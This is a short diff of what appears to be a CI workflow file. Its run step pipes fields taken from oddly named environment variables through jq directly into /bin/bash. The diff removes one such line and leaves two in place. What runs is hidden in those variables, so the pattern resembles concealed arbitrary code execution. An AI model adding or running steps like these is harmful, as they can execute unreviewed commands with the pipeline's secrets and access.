@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$wmhe1785" | jq -r .alf40142 | /bin/bash
           echo $uy22374 | jq -r .ilim4672 | /bin/bash
-          printf '%s' "$bwq95758" | jq -r .gu0551 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
